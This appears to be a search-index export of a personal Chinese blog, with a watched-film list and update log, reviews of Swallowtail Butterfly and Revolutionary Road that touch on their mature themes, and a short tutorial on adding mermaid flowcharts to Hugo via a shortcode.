半个喜剧 盗梦空间 我爱你 (love ever ends) 百元之恋 心动 禁闭岛 肖申克的救赎 恋空 霸王别姬 这个杀手不太冷 我的野蛮女友 盗梦侦探/红辣椒 阿甘正传 言叶之庭 寻枪 泰坦尼克号 辛德勒的名单 骡子 忌日快乐 机器人总动员 放牛班的春天 海上钢琴师 勇敢的心 楚门的世界 教父 - 系列 无间道 - 系列 当幸福来敲门 西西里的美丽传说 少年派的奇幻漂流 周处除三害 天堂影片院 不要抬头 少年时代 三天两夜 - 日本 1997 年 指环王 - 系列 鬼子来了 十二怒汉 飞屋环游记 闻香识女人 沉睡魔咒 1 我在雨中等你 两杆大烟枪 飞越疯人院 寻梦环游记 死亡诗社 甲方乙方 v 字仇杀队 美丽心灵 情书 钢琴家 本杰明巴顿奇事 美国往事 分手说爱你 看不见的客人 扬名立万 哈利波特 - 系列 让子弹飞 大圣归来 七宗罪 无名 被嫌弃的松子的一生 低俗小说 天使爱美丽 邪不压正 沉默的羔羊 猫鼠游戏 穆赫兰道 蝴蝶效应 心灵捕手 爱尔兰人 阳光灿烂的日子 鸟人 不能说的秘密 狩猎 喜剧之王 变脸 (1995) 告白 活着 大象席地而坐 无主之作 全城热恋 芳华 成长教育 买凶拍人 我不是潘金莲 等一个人咖啡 风声 her 大鱼 消失的爱人 大佛普拉斯 本日公休 少年收容所 蔡国强的艺术 罗曼蒂克消亡史 致命魔术 被光抓走的人 致命 id 心灵奇旅 荒蛮故事 一级恐惧 孩子 L’enfant The Machinist 阳光姐妹淘 爱在黎明破晓前 - 系列 恐怖直播 超脱 上帝之城 幸福终点站 神偷奶爸 阿凡达 1、2 电锯惊魂 - 系列 真爱至上 黑天鹅 星际穿越 记忆碎片 傲慢与偏见 心迷宫 鲸 雨人 卢旺达饭店 恋恋笔记本 解救吾先生 第十一回 阳光普照 被解救的姜戈 三块广告牌 她与她的猫 你的名字 拨鼠之日 朱丽叶与梁山伯 观音山 人在囧途 入侵华尔街 疯狂的赛车 邮差 风平浪静 追凶者也 爆裂鼓手 天下无双 环形使者 模仿游戏 猜火车 后来的我们 恐怖游轮 无人知晓 安阳婴儿 香水 波斯语课 七号房的礼物 (土耳其) 小妇人 初缠恋后的二人世界 登月第一人 大赢家 神秘河 立春 江湖告急 黑客帝国 - 系列 无名之辈 浪潮 朗读者 白日焰火 黑社会 1/2 彗星来的那一夜 源代码 撞车 我想吃掉你的胰脏 桃姐 the big short 梦之安魂曲 秦颂 一个陌生女人的来信 年会不能停 隐入尘烟 太空救援 神探 JOKER 无姓之人 血钻 传染病 麦克法兰 实习生 这个男人来自地球 特朗勃 紫日 三大队 哆啦 A 梦伴我同行 2 功夫 孟买酒店 小情人 - 泰国 出路 -《为什么贫穷》系列纪录片第八集 发条橙 地心引力 十二夜 非常嫌疑犯 毕业生 房间 只有芸知道 谁先爱上他的 信条 断裂 少年的你 保你平安 寄生虫 全裸导演 何以为家 半支烟 国王的演讲 误杀瞒天记 花月杀手 好莱坞往事 完美的世界 婚姻故事 好景当前 哪吒之魔童降世 英剧 -the end of the fucking world(去他妈的世界) 第一、二季 英剧 - 黑镜第一季 英剧 - 无人生还 韩剧 - 王国 美剧 - 越狱系列 美剧 - 纸牌屋 美剧 - 绝命毒师 美剧 - 风骚律师 美剧 - 诺尔切贝利 美剧 - 制造杀人犯 美剧 - 权力的游戏 意剧 - 我的天才女友 美剧 - 三体 - 第一季 - 网飞 国产剧 - 蜗居 国产剧 - 北京青年 国产剧 - 裸婚时代 国产剧 - 北京爱情故事 国产剧 - 奋斗 国产剧 - 倚天屠龙记 (苏有朋版) 国产剧 - 毛骗 国产剧 - 武林外传 国产剧 - 余罪 1、2 综艺 - 美好的时光第一季 ","date":"2019-04-28","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E6%88%91%E7%9A%84%E5%BD%B1%E7%89%87%E8%AE%B0%E5%BD%95/:2:0","series":null,"tags":["blog","影片"],"title":"我的影片记录","uri":"/posts/%E7%AC%94%E8%AE%B0/%E6%88%91%E7%9A%84%E5%BD%B1%E7%89%87%E8%AE%B0%E5%BD%95/#影片列表"},{"categories":["blog"],"content":" 更新日志20190602: 新增 人工智能 20190702: 新增 成长教育 20190706: 新增 何以为家 20190804: 新增 房间 20190821: 新增 寄生虫/全裸导演 20190827: 新增 黑社会1/2 20190908: 新增 骡子/忌日快乐 20190911: 新增 危楼愚夫 20191014: 新增电影且加入电视剧 -英剧-the end of the fucking world(去他妈的世界)第一季、美剧-越狱系列、美剧-纸牌屋、美剧-权力的游戏、国产剧-蜗居、国产剧-北京青年、国产剧-裸婚时代、国产剧-北京爱情故事、国产剧-奋斗、哪吒之魔童降世、国产剧-毛骗、国产剧-武林外传 20191015: 新增 国产剧-余罪1、2 20191026: 新增 断裂 20191112: 新增 JOKER 20191117: 新增 少年时代 20191127: 新增 成为简·奥斯汀 20191127: 新增 少年的你 20191129: 新增 韩剧-王国 20191201: 新增 三天两夜-日本电影 20191207: 新增 沉睡恶魔1、环形使者、好莱坞往事 20191215: 新增 误杀瞒天记 20191216: 新增 初缠恋后的二人世界，超级好看 20191217: 新增 小情人-泰国 20191222: 新增 谁先爱上他的 20191225: 新增 初恋红豆冰、半个喜剧 20191228: 新增 the big short，不能说的秘密 20200102: 新增 登月第一人 20200104: 新增 好景当前 20200110: 新增 别告诉她(The Farewell) 20200114: 新增 少年收容所、被光抓走的人 20200123: 新增 勇敢的心 20200131: 新增 只有芸知道、一个陌生女人的来信 20200203: 新增 无名之辈、十二猴子 20200227: 新增 传染病 20200302: 新增 土拨鼠之日 20200303: 新增 婚姻故事 20200311: 新增 我想吃掉你的胰脏 20200313: 新增 英剧-无人生还 20200315: 新增 麦克法兰 20200322: 新增 实习生 20200406: 新增 阳光普照 20200408: 新增 大佛普拉斯 20200411: 新增 无主之作 20200420: 新增 孟买酒店 20200501: 新增 特朗勃 20200504: 新增 神秘河 20200510: 新增 爱尔兰人 20200719: 新增 盗梦侦探/红辣椒 20200727: 新增 我在雨中等你 20200802: 新增 小妇人 20200809: 新增 天气之子、秒速五厘米、言叶之庭、她与她的猫 20200920: 新增 寻枪 20200923: 新增 无姓之人 20201020: 新增 荒蛮故事 20201122: 新增 大象席地而坐 20201122: 新增 变脸(1995) 20201206: 新增 信条 20200112: 新增 十二夜 20200117: 新增 半支烟 20210119: 新增 孩子 L'enfant 20210119: 新增 毕业生 20210126: 新增 秦颂 20210205: 新增 入侵华尔街 20210210: 新增 人在囧途 20210228: 新增 风平浪静 20210313: 新增 罗曼蒂克消亡史 20210314: 新增 买凶拍人 20210323: 新增 心灵奇旅 20210328: 新增 蔡国强的艺术 20210408: 新增 波斯语课 20210409: 新增 出路-《为什么贫穷》系列纪录片第八集 20210422: 新增 观音山 20210502: 新增 七号房的礼物(土耳其) 20210511: 新增 桃姐 20210518: 新增 朱丽叶与梁山伯 20210523: 新增 第十一回、天下无双 20210530: 新增 综艺-美好的时光第一季 20210613: 新增 美剧-绝命毒师、美剧-风骚律师、哆啦A梦伴我同行2 20210615: 新增 意剧-我的天才女友 20210620: 新增 太空救援 20210716: 新增 追凶者也 20210719: 新增 海角七号 20210723: 新增 风声 20210807: 新增 疯狂的赛车 20210809: 新增 甲方乙方 20211226: 新增 鸟人 20220221: 新增 英剧-黑镜第一季 20220306: 新增 紫日 20220314: 新增 金钱男孩 20220509: 新增 扬名立万 20220805: 新增 神探 20220828: 新增 立春 20221127: 新增 阿凡达1 20230326: 新增 大赢家 20230402: 新增 阿凡达2 20230408: 新增 不要抬头 20230423: 新增 无名 20230426: 新增 鲸 20230820: 新增 本日公休, 我爱你(love ever ends), 亲爱的杀手(be alive just like you) 20231014: 新增 龙在边缘 20231104: 新增 安阳婴儿 20240226: 新增 保你平安 20240307: 新增 三大队 20240323: 新增 三体-第一季-网飞 20240331: 新增 周处除三害 ","date":"2019-04-28","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E6%88%91%E7%9A%84%E5%BD%B1%E7%89%87%E8%AE%B0%E5%BD%95/:3:0","series":null,"tags":["blog","影片"],"title":"我的影片记录","uri":"/posts/%E7%AC%94%E8%AE%B0/%E6%88%91%E7%9A%84%E5%BD%B1%E7%89%87%E8%AE%B0%E5%BD%95/#更新日志"},{"categories":["blog"],"content":"又有好几天没有写博客了。我谷歌日历上的任务，也不知道多久没更新了。。明天开始把。。本来是打算9点开始看电影，看完就去睡觉的。结果。。。。。真的是一部非常好看的电影啊","date":"2019-04-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E7%94%B5%E5%BD%B1_%E7%87%95%E5%B0%BE%E8%9D%B6/","series":null,"tags":["blog","影片"],"title":"电影_燕尾蝶","uri":"/posts/%E7%AC%94%E8%AE%B0/%E7%94%B5%E5%BD%B1_%E7%87%95%E5%B0%BE%E8%9D%B6/"},{"categories":["blog"],"content":" 简介lines 又有好几天没有写博客了。我谷歌日历上的任务，也不知道多久没更新了。。明天开始把。。本来是打算 9 点开始看电影，看完就去睡觉的。结果。。。。。 真的是一部非常好看的电影啊。 ","date":"2019-04-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E7%94%B5%E5%BD%B1_%E7%87%95%E5%B0%BE%E8%9D%B6/:1:0","series":null,"tags":["blog","影片"],"title":"电影_燕尾蝶","uri":"/posts/%E7%AC%94%E8%AE%B0/%E7%94%B5%E5%BD%B1_%E7%87%95%E5%B0%BE%E8%9D%B6/#简介"},{"categories":["blog"],"content":" 再次点开电影在写这篇文章的时候，我又点开了电影。除了印象中的片头旁白，我忘记了很多细节。 正式进入剧情的时候。一帮人跑向一辆披着丹盗流浪字样的火车。 随后镜头回到草丛里。里面躺着一个人。这一幕意味着故事从一开始，并不是毫无关联的起点。而是一个故事中的节点。 ","date":"2019-04-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E7%94%B5%E5%BD%B1_%E7%87%95%E5%B0%BE%E8%9D%B6/:2:0","series":null,"tags":["blog","影片"],"title":"电影_燕尾蝶","uri":"/posts/%E7%AC%94%E8%AE%B0/%E7%94%B5%E5%BD%B1_%E7%87%95%E5%B0%BE%E8%9D%B6/#再次点开电影"},{"categories":["blog"],"content":" 主人公","date":"2019-04-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E7%94%B5%E5%BD%B1_%E7%87%95%E5%B0%BE%E8%9D%B6/:3:0","series":null,"tags":["blog","影片"],"title":"电影_燕尾蝶","uri":"/posts/%E7%AC%94%E8%AE%B0/%E7%94%B5%E5%BD%B1_%E7%87%95%E5%B0%BE%E8%9D%B6/#主人公"},{"categories":["blog"],"content":" 雅佳 (音译) 最开始的细节，死去的就是她的母亲。 她的母亲是一名妓女。死去以后她母亲的“朋友们”拿走了原属于雅佳的一切。经过她们的出卖，来到了固力果的身边。 固力果也是一名妓女。原本也打算卖掉雅佳。却留意到了店里的小女孩们和毒品。留下了雅佳。 固力果因为自己有蝴蝶纹身，称呼自己为蝴蝶。所以给雅佳画了一个蝴蝶幼虫。为她起名雅佳。 雅佳认识了固力果的朋友们，并且在废品厂留了下来，融入了大家庭。 一次嫖客发现了藏在隔间的雅佳，产生了歹意。最终结果是嫖客死掉了。而在嫖客体内发现的磁带，改变了大家。 新开了 live house。由于一系列的变故。让雅佳成为了剧情的承接点。同时人设也开始变得立体起来。 探望飞鸿，每次带着精心准备的食物。展现了爱心。 有了自己的想法，编故事欺骗了飞鸿。因为现实是固力果其实为了自己的发展，抛弃了大家庭。 同时也无知无畏，自己注射了毒品。 拆掉的 live house，让雅佳决定纹身。同时体现了对飞鸿的不理解，以及对固力果的不可割舍。 记起了自己的童年，让蝴蝶和自己关联得更加紧密。 保持纯真。想依靠自己的能力，用钱重聚到大家。 她认为飞鸿就是元都人。她对自己以及大家的认知都是元都人。在结尾，她过着自己的生活。 她与刘梁魁对白也交代了一个完整的故事结局。 ","date":"2019-04-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E7%94%B5%E5%BD%B1_%E7%87%95%E5%B0%BE%E8%9D%B6/:3:1","series":null,"tags":["blog","影片"],"title":"电影_燕尾蝶","uri":"/posts/%E7%AC%94%E8%AE%B0/%E7%94%B5%E5%BD%B1_%E7%87%95%E5%B0%BE%E8%9D%B6/#雅佳-音译"},{"categories":["blog"],"content":" 固力果 在一开始，便交代了她的背景。 和两个哥哥。过着偷盗的日子。 二哥意外的死亡，才让固力果纹上了蝴蝶。成为自己的身份。 或许是因为厌倦了那样的生活，固力果选择了做妓女，而她的大哥，也因此离开了她，且不相认。 在 live house 后，被唱片发现了。这时候我开始认为她是爱着飞鸿的。并且挺听取飞鸿的意见。 可是人会变的。她变了。为了自己的名利和名声，断开了与之前一起的联系。成为了上海宝贝。中间有一段和飞鸿啪啪啪的过程，心里想到的都是明星后的自己，却忽视了眼前人。 在最终被挖出过往以后。又找到了飞鸿。 飞鸿也因她而死。 随后回到了大家庭。做回了自己。 她有着悲惨的故事背景。出于生活的无奈，做上了妓女。而 live house 才让她成长。发生的种种事情，让她认识了自己，找回了自己。 ","date":"2019-04-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E7%94%B5%E5%BD%B1_%E7%87%95%E5%B0%BE%E8%9D%B6/:3:2","series":null,"tags":["blog","影片"],"title":"电影_燕尾蝶","uri":"/posts/%E7%AC%94%E8%AE%B0/%E7%94%B5%E5%BD%B1_%E7%87%95%E5%B0%BE%E8%9D%B6/#固力果"},{"categories":["blog"],"content":" 飞鸿 他始终爱着固力果。 一直在元都无忧无虑的生活着。 当有了不义之财，第一想法就是坚持开办 live house，为了让固力果开心，展示才华。 飞鸿看向固力果的眼神，那就叫爱情。 之后的唱片公司。毅然帮固力果做主，帮助固力果有更好的事业成长。 却被唱片公司陷害。好运回到了 live house，却发现伤人的不是唱片公司。而是固力果。 成全了固力果，自己做了罪人。当固力果有难，表现了无畏。为了固力果和大家，不惜丢掉了性命。 ","date":"2019-04-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E7%94%B5%E5%BD%B1_%E7%87%95%E5%B0%BE%E8%9D%B6/:3:3","series":null,"tags":["blog","影片"],"title":"电影_燕尾蝶","uri":"/posts/%E7%AC%94%E8%AE%B0/%E7%94%B5%E5%BD%B1_%E7%87%95%E5%B0%BE%E8%9D%B6/#飞鸿"},{"categories":["blog"],"content":" 刘梁魁 他失去了弟弟。有一个做妓女的妹妹。一个心狠手辣的黑社会老大。 但在黑社会如果有一个这样的妹妹，谁会来做小弟呢？除了这个原因，与固力果的不相认，有他自己对妹妹的无奈。 他有爱心，救活了雅佳。有情义，对自己的妹妹念念不忘。 片尾。他在车上和司机说，拿到了磁带赚一票，就回家。可转眼，变遇到了雅佳。拿到了磁带。忍不住问了雅佳她和妓女固力果的情况。没有选择追上去找回固力果。 说明了他的心里，不愿意承认固力果做妓女的事实。拿到了磁带，他真的会回去吗？ 关于他的故事，就像是侠客的儿女情长。 ","date":"2019-04-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E7%94%B5%E5%BD%B1_%E7%87%95%E5%B0%BE%E8%9D%B6/:3:4","series":null,"tags":["blog","影片"],"title":"电影_燕尾蝶","uri":"/posts/%E7%AC%94%E8%AE%B0/%E7%94%B5%E5%BD%B1_%E7%87%95%E5%B0%BE%E8%9D%B6/#刘梁魁"},{"categories":["blog"],"content":" 总结雅佳是一个有爱心，有自己想法，无知无畏，带有蝴蝶纹身，保持纯真，捆绑主题的人物。 固力果属于小市井人物，有自己的成长，爱情，事业，过往，抉择。 飞鸿有情有义。除了爱人，无欲无求。而为了自己心中爱的一切，甚至可以深受无限的苦痛。 刘梁魁为了目的心狠手辣，但又有着自己的痛处。 就是这些人，组成了这样一个故事。 ","date":"2019-04-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E7%94%B5%E5%BD%B1_%E7%87%95%E5%B0%BE%E8%9D%B6/:4:0","series":null,"tags":["blog","影片"],"title":"电影_燕尾蝶","uri":"/posts/%E7%AC%94%E8%AE%B0/%E7%94%B5%E5%BD%B1_%E7%87%95%E5%B0%BE%E8%9D%B6/#总结"},{"categories":["blog"],"content":"有一段时间用有道云笔记来做笔记。里面有一个非常喜欢的功能就是流程图。让阅读文章的时候，体验更加的友好。同时我在看自己的站点过程中，觉得不够美观。更多的使用图表类似的功能，会让表达更加直观。所以今天就来动手做一下","date":"2019-03-30","objectID":"/posts/%E7%AC%94%E8%AE%B0/hugo%E6%B5%81%E7%A8%8B%E5%9B%BEmermaid/","series":null,"tags":["blog","hugo"],"title":"hugo流程图mermaid","uri":"/posts/%E7%AC%94%E8%AE%B0/hugo%E6%B5%81%E7%A8%8B%E5%9B%BEmermaid/"},{"categories":["blog"],"content":" 简介有一段时间用有道云笔记来做笔记。里面有一个非常喜欢的功能就是流程图. 同时我在看自己的站点过程中，觉得不够美观。更多的使用图表类似的功能，会让表达更加直观。所以今天就在 hugo 里加上图表. ","date":"2019-03-30","objectID":"/posts/%E7%AC%94%E8%AE%B0/hugo%E6%B5%81%E7%A8%8B%E5%9B%BEmermaid/:1:0","series":null,"tags":["blog","hugo"],"title":"hugo流程图mermaid","uri":"/posts/%E7%AC%94%E8%AE%B0/hugo%E6%B5%81%E7%A8%8B%E5%9B%BEmermaid/#简介"},{"categories":["blog"],"content":" Hugo 的渲染","date":"2019-03-30","objectID":"/posts/%E7%AC%94%E8%AE%B0/hugo%E6%B5%81%E7%A8%8B%E5%9B%BEmermaid/:2:0","series":null,"tags":["blog","hugo"],"title":"hugo流程图mermaid","uri":"/posts/%E7%AC%94%E8%AE%B0/hugo%E6%B5%81%E7%A8%8B%E5%9B%BEmermaid/#hugo-的渲染"},{"categories":["blog"],"content":" 使用 markdown主要采用 markdown 文件进行文章的编写，它的方案如下: Md 文件的解析，是用的 blackfriday 除了已有的自带拓展，提供 shortcodes 来进行功能的拓展 ","date":"2019-03-30","objectID":"/posts/%E7%AC%94%E8%AE%B0/hugo%E6%B5%81%E7%A8%8B%E5%9B%BEmermaid/:2:1","series":null,"tags":["blog","hugo"],"title":"hugo流程图mermaid","uri":"/posts/%E7%AC%94%E8%AE%B0/hugo%E6%B5%81%E7%A8%8B%E5%9B%BEmermaid/#使用-markdown"},{"categories":["blog"],"content":" Shortcodes 的演示使用 {{\u003c youtube 8HnLRrQ3RS4 \u003e}} 的简短编写，即可完成如下 youtube 视频的展示。 想要自动播放的话，使用 {{\u003c youtube id=\"8HnLRrQ3RS4\" autoplay=\"true\" \u003e}}\" 即可。 ","date":"2019-03-30","objectID":"/posts/%E7%AC%94%E8%AE%B0/hugo%E6%B5%81%E7%A8%8B%E5%9B%BEmermaid/:2:2","series":null,"tags":["blog","hugo"],"title":"hugo流程图mermaid","uri":"/posts/%E7%AC%94%E8%AE%B0/hugo%E6%B5%81%E7%A8%8B%E5%9B%BEmermaid/#shortcodes-的演示"},{"categories":["blog"],"content":" 为 markdown 拓展流程图","date":"2019-03-30","objectID":"/posts/%E7%AC%94%E8%AE%B0/hugo%E6%B5%81%E7%A8%8B%E5%9B%BEmermaid/:3:0","series":null,"tags":["blog","hugo"],"title":"hugo流程图mermaid","uri":"/posts/%E7%AC%94%E8%AE%B0/hugo%E6%B5%81%E7%A8%8B%E5%9B%BEmermaid/#为-markdown-拓展流程图"},{"categories":["blog"],"content":" 关于 mermaidmermaid 是一个 js 库，用来渲染流程图用的。2 w 多的 star，看了一下文档，觉得博客是肯定够了的。 如果真的要求特别高，那不如用专业软件做出来，导出图片更好。 ","date":"2019-03-30","objectID":"/posts/%E7%AC%94%E8%AE%B0/hugo%E6%B5%81%E7%A8%8B%E5%9B%BEmermaid/:3:1","series":null,"tags":["blog","hugo"],"title":"hugo流程图mermaid","uri":"/posts/%E7%AC%94%E8%AE%B0/hugo%E6%B5%81%E7%A8%8B%E5%9B%BEmermaid/#关于-mermaid"},{"categories":["blog"],"content":" 拓展步骤 在你使用的主题中，找到 yoursite/themes/themes_name/layouts 文件夹，如果没有 shortcodes 文件夹，就自己新建一个 把 mermaid的script标签 贴到 yoursite/themes/themes_name/layouts/partials/footer.html 的 footer外部 \u003c!--head部分添加--\u003e \u003cscript src=\"https://cdn.bootcss.com/mermaid/8.0.0-rc.8/mermaid.min.js\"\u003e\u003c/script\u003e 在 shortcodes 目录下新建 mermaid.html 文件 \u003c!--mermaid.html--\u003e \u003cdiv class=\"mermaid\" align=\"{{ if .Get \"align\" }} {{ .Get \"align\" }} {{ else }} center {{ end }}\"\u003e {{ safeHTML .Inner }} \u003c/div\u003e ","date":"2019-03-30","objectID":"/posts/%E7%AC%94%E8%AE%B0/hugo%E6%B5%81%E7%A8%8B%E5%9B%BEmermaid/:3:2","series":null,"tags":["blog","hugo"],"title":"hugo流程图mermaid","uri":"/posts/%E7%AC%94%E8%AE%B0/hugo%E6%B5%81%E7%A8%8B%E5%9B%BEmermaid/#拓展步骤"},{"categories":["blog"],"content":" Ojbk，测试一下 {{\u003c mermaid \u003e}} sequenceDiagram participant Alice participant Bob Alice-\u003eJohn: Hello John, how are you? loop Healthcheck John-\u003eJohn: Fight against hypochondria end Note right of John: Rational thoughts \u003cbr/\u003eprevail... John--\u003eAlice: Great! John-\u003eBob: How about you? Bob--\u003eJohn: Jolly good! {{\u003c /mermaid \u003e}} SequenceDiagram Participant Alice Participant Bob Alice-\u003eJohn: Hello John, how are you? Loop Healthcheck John-\u003eJohn: Fight against hypochondria End Note right of John: Rational thoughts prevail... John--\u003eAlice: Great! John-\u003eBob: How about you? Bob--\u003eJohn: Jolly good! ","date":"2019-03-30","objectID":"/posts/%E7%AC%94%E8%AE%B0/hugo%E6%B5%81%E7%A8%8B%E5%9B%BEmermaid/:3:3","series":null,"tags":["blog","hugo"],"title":"hugo流程图mermaid","uri":"/posts/%E7%AC%94%E8%AE%B0/hugo%E6%B5%81%E7%A8%8B%E5%9B%BEmermaid/#ojbk测试一下"},{"categories":["blog"],"content":" 文档参考mermaid文档 hugo文档 ","date":"2019-03-30","objectID":"/posts/%E7%AC%94%E8%AE%B0/hugo%E6%B5%81%E7%A8%8B%E5%9B%BEmermaid/:4:0","series":null,"tags":["blog","hugo"],"title":"hugo流程图mermaid","uri":"/posts/%E7%AC%94%E8%AE%B0/hugo%E6%B5%81%E7%A8%8B%E5%9B%BEmermaid/#文档参考"},{"categories":["blog"],"content":"我几乎保持着每周至少2部电影的节奏。前几天在找电影的时候，翻到了小李子(莱昂纳多·迪卡普里奥-Leonardo DiCaprio)的wiki，就想来看看这部电影。个人的评分应该能给到8分以上。可能含有剧透哦","date":"2019-03-17","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E7%94%B5%E5%BD%B1_%E9%9D%A9%E5%91%BD%E4%B9%8B%E8%B7%AF/","series":null,"tags":["blog","影片"],"title":"电影_革命之路","uri":"/posts/%E7%AC%94%E8%AE%B0/%E7%94%B5%E5%BD%B1_%E9%9D%A9%E5%91%BD%E4%B9%8B%E8%B7%AF/"},{"categories":["blog"],"content":" 简介lines 我几乎保持着每周至少 2 部电影的节奏。前几天在找电影的时候，翻到了小李子 (莱昂纳多·迪卡普里奥 -Leonardo DiCaprio) 的 wiki，就想来看看这部电影。个人的评分应该能给到 8 分以上。可能含有剧透哦 ","date":"2019-03-17","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E7%94%B5%E5%BD%B1_%E9%9D%A9%E5%91%BD%E4%B9%8B%E8%B7%AF/:1:0","series":null,"tags":["blog","影片"],"title":"电影_革命之路","uri":"/posts/%E7%AC%94%E8%AE%B0/%E7%94%B5%E5%BD%B1_%E9%9D%A9%E5%91%BD%E4%B9%8B%E8%B7%AF/#简介"},{"categories":["blog"],"content":" 剧情概况分析","date":"2019-03-17","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E7%94%B5%E5%BD%B1_%E9%9D%A9%E5%91%BD%E4%B9%8B%E8%B7%AF/:2:0","series":null,"tags":["blog","影片"],"title":"电影_革命之路","uri":"/posts/%E7%AC%94%E8%AE%B0/%E7%94%B5%E5%BD%B1_%E9%9D%A9%E5%91%BD%E4%B9%8B%E8%B7%AF/#剧情概况分析"},{"categories":["blog"],"content":" 男主和女主吵架可能只是生活间的一件小事情，也有可能是生活中压抑了很久。 在一次矛盾中，双方爆发了矛盾。这其实很平常，恋人之间都会有。 看的时候我在想:或许我也会这样子耍脾气，或者受不了突然而然的耍性子。 幸运的是他们彼此都深爱着对方。找到了一个解决方案。 ","date":"2019-03-17","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E7%94%B5%E5%BD%B1_%E9%9D%A9%E5%91%BD%E4%B9%8B%E8%B7%AF/:2:1","series":null,"tags":["blog","影片"],"title":"电影_革命之路","uri":"/posts/%E7%AC%94%E8%AE%B0/%E7%94%B5%E5%BD%B1_%E9%9D%A9%E5%91%BD%E4%B9%8B%E8%B7%AF/#男主和女主吵架"},{"categories":["blog"],"content":" 准备去巴黎找到一个解决的办法 我的观念中: 男的在吵架以后是需要时间冷静下来，或者放空自己的。而女的不一样。当场就需要把问题解决。时间越长，问题就会变得越严重。我很少遇到说冷静了以后，再来和你认错的女生。至少她们表面上不会来主动联系你。我很佩服那些刚说完，在极短时间之内就能认识到问题。并且解决他的男人。 而电影中女主却主动来解决这件事情，非常了不起。 在一番对谈以后，男主接受了对方的想法，共同决定去巴黎。开始新的生活，解决生活中的矛盾。 并且和周围的亲朋好友都说了这件事情。周围的人都不看好，并且觉得是个奇怪而且不现实的想法。 而一个精神病院出来的人，却理解他们。很不可思议，但是却合情合理。 精神病人直面问题的根本，没有任何道德，社会，生活等方方面面的束缚。保持着初心。 如果是我，也会觉得不现实。我其实是思想上的巨人，行动上的矮子。晚上想好了一切，第二天却还是如初。更别说和电影中一样努力而积极的态度了。但是我要改。而且一直在努力修正。其实这个站点，以及我尽量让自己写日志，就是我想改变的一部分。希望自己能保持下去。 ","date":"2019-03-17","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E7%94%B5%E5%BD%B1_%E9%9D%A9%E5%91%BD%E4%B9%8B%E8%B7%AF/:2:2","series":null,"tags":["blog","影片"],"title":"电影_革命之路","uri":"/posts/%E7%AC%94%E8%AE%B0/%E7%94%B5%E5%BD%B1_%E9%9D%A9%E5%91%BD%E4%B9%8B%E8%B7%AF/#准备去巴黎"},{"categories":["blog"],"content":" 女主怀孕，男主晋升女主角检测出来了怀孕。男主在工作中意外的升职。 怀孕让去巴黎，成为了一个不那么正确的决定。 没有人会想在怀孕的时候离开熟悉的地方而去到未知的环境，除非是为了小孩移民。 而男主的升职，会让生活变得更加美好。 这两件事情都直接影响到了男主。而女主确实心意已决。哪怕是自己引流掉小孩，也要去。同时对于男主的动摇，心存愤怒。 男主也无法接受女主的言论和引流想法。 引发了更大的矛盾。 ","date":"2019-03-17","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E7%94%B5%E5%BD%B1_%E9%9D%A9%E5%91%BD%E4%B9%8B%E8%B7%AF/:2:3","series":null,"tags":["blog","影片"],"title":"电影_革命之路","uri":"/posts/%E7%AC%94%E8%AE%B0/%E7%94%B5%E5%BD%B1_%E9%9D%A9%E5%91%BD%E4%B9%8B%E8%B7%AF/#女主怀孕男主晋升"},{"categories":["blog"],"content":" 女主让步，矛盾激化 女主无能为力，重新忍受与之前的一样，毫无激情的生活。并且更加消极。 而男主却不是这么认为的。对女主的态度产生了不满，激化出来了更多的矛盾。 她说:我不再爱你了。 精神病人的到访，将所有隐藏的矛盾。一一解刨了出来。 看出来女主的一如既往，便开始责问男主。毕竟在他看来，一件正确的事情，没有任何力量可以阻挡。 男主变得愤怒，我想是因为一个外人站在了女主的角度提问。虽然不了解所有的情况。却也句句都很直白，一针见血。 当精神病人向女主表达歉意，而看到女主态度的时候，也理解了男主为什么会如此愤怒。 精神病人也知道了，矛盾是双方的问题。 精神病人说:我很高兴我不会是那个未出世的孩子。 女主觉得男主已经不知道什么是爱了。 男主觉得女主的态度让人抓狂。同时也让自己进入了极度的紧张状态。 男主其实并没有多大的错误，更加的理性。这个不是优柔寡断或者说善变。 女主为了爱情，为了生活，做出了很多的努力。当没有办法和相爱的人一起进退，她选择了不爱。 ","date":"2019-03-17","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E7%94%B5%E5%BD%B1_%E9%9D%A9%E5%91%BD%E4%B9%8B%E8%B7%AF/:2:4","series":null,"tags":["blog","影片"],"title":"电影_革命之路","uri":"/posts/%E7%AC%94%E8%AE%B0/%E7%94%B5%E5%BD%B1_%E9%9D%A9%E5%91%BD%E4%B9%8B%E8%B7%AF/#女主让步矛盾激化"},{"categories":["blog"],"content":" 女主引流死亡，男主悲痛 女主回到家里。为男主做了早餐。像是一切美好如初。 其实这算是女主的一个补偿，用来补偿自己已经想好的念头(引流掉小孩)。 或许她有一个人去欧洲的计划，或许她准备好聚好散，或许这是她对于之后生活计划。 男主带着小孩去到了城里。 没有人愿意见到这个的结局。两个相爱的人，生活中的矛盾引发了这样一出闹剧。 或许很多人接受不了女主这样的处理方式。而我的看法是，这是她自己的选择。如果她自己如此积极/努力的情况下，也都没法帮助到自己。我想不应该指责她。 我在很小的时候，知道了人最多也就 100 岁。而 100 岁以后就会死亡。我的想象中，会是睡着了一样没有任何感觉。永久永久下去。我很害怕。 我坐在小霸王游戏机面前，眼泪直流。我妈妈很担心我，和我说: 如果一个人能活到 500 岁，10000 岁又能怎么样？有很多人自杀，是为什么？是因为他们受不了一些痛苦/对生活产生了绝望。他们不愿意活那么久。所以你不要担心这件事情，你要把自己的生活变美好。 